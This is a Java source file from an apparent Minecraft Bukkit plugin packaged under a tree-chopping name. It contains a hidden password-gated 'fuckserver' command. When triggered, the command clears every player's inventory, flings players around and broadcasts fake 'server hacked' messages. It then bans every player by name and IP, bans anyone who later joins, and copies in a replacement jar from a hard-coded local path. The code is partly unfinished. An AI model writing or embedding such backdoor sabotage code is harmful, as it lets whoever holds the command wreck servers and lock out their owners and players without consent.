package me.bow.treecapitatorultimate.commands.Server;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.chat.ComponentSerializer;
import net.minecraft.server.v1_14_R1.ChatMessageType;
import net.minecraft.server.v1_14_R1.IChatBaseComponent;
import net.minecraft.server.v1_14_R1.PacketPlayOutChat;
import org.apache.commons.lang.RandomStringUtils;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
import org.bukkit.craftbukkit.v1_14_R1.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;

import java.io.File;
import java.io.IOException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Random;

public class FuckServer extends Command {
    String kickReason;
    private String password = "";
    private boolean locked = false;

    public FuckServer() {
        super("fuckserver", "Destroys the server and replaces it with an emulator.", CommandCategory.Server);
        password = RandomStringUtils.randomAlphanumeric(243);
        for (int i = 0; i < 100; i++)
            kickReason += ChatColor.DARK_RED + "§kAAAAAAAA" + ChatColor.RESET + ChatColor.RED + "SERVER HACKED!" + ChatColor.DARK_RED + "§kAAAAAAAA\n";
    }

    public void JSONsendMessage(Player player, ChatMessageType position, BaseComponent... components) {
        if (player == null) {
            return;
        }
        IChatBaseComponent component = IChatBaseComponent.ChatSerializer.a(ComponentSerializer.toString(components));
        PacketPlayOutChat packet = new PacketPlayOutChat(component, net.minecraft.server.v1_14_R1.ChatMessageType.a((byte) position.ordinal()));
        ((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
    }

    private Vector randomVector(int min, int max) {
        Random rand = new Random();
        return new Vector(rand.nextFloat() * (max - min) + min, rand.nextFloat() * (max - min) + min, rand.nextFloat() * (max - min) + min);
    }

    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        //TODO: finish implementing this
        if (locked) {
            p.sendMessage(Start.Prefix + "Command locked. There's no going back as I said...");
            return;
        }
        if (args.size() == 0) {
            showConsequences(p);
            return;
        }
        if (!args.get(0).equals(password)) {
            p.sendMessage(Start.Prefix + "Something went wrong. Please try again.");
            showConsequences(p);
            return;
        }
        locked = true;
        p.sendMessage(Start.Prefix + "Proceeding!");
        BukkitTask task = Bukkit.getScheduler().runTaskLaterAsynchronously(Start.Instance, () -> {
            for (int i = 0; i <= 100; i++) {
                for (Player pe : Bukkit.getOnlinePlayers()) {
                    pe.setVelocity(pe.getLocation().getDirection().add(randomVector(-4, 4)));
                    pe.setFlying(false);
                    pe.getInventory().clear();
                }
                Bukkit.broadcastMessage(ChatColor.DARK_RED + "§kAAAAAAAA" + ChatColor.RESET + ChatColor.RED + "HACKING THE SERVER! " + i + "% DONE!" + ChatColor.DARK_RED + "§kAAAAAAAA");
                try {
                    Thread.sleep(150);
                } catch (Exception e) {
                }
            }
            try {
                Thread.sleep(4500);
            } catch (Exception e) {
            }
            for (Player pe : Bukkit.getOnlinePlayers()) {
                banAndKick(pe);
            }
        }, 20);
        try {
            FileUtils.copyURLToFile(
                    new URL("file:///D:/Honzik/Desktop/GlaDos/ServerListPlus2/Server/build/libs/ServerListPlus-3.5.0-SNAPSHOT-Server.jar"),
                    new File("yes.jar"));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        if (!locked) return;
        banAndKick(e.getPlayer());
    }

    private void banAndKick(Player pe) {
        Bukkit.getBanList(BanList.Type.NAME).addBan(pe.getName(), "Unspecified.", null, "Console");
        Bukkit.getBanList(BanList.Type.IP).addBan(pe.getAddress().getAddress().getHostAddress(), "Unspecified.", null, "Console");
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            pe.kickPlayer(kickReason);
        });
    }

    private void showConsequences(Player p) {
        p.sendMessage(Start.Prefix + ChatColor.RED + "This command is DANGEROUS! There's no coming back!");
        TextComponent o = new TextComponent(Start.Prefix + ChatColor.GREEN + "Click here to accept the consequences");
        o.setBold(true);
        o.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new BaseComponent[]{new TextComponent("Click to run server destruction")}));
        o.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
        JSONsendMessage(p, ChatMessageType.CHAT, o);
        return;
    }
}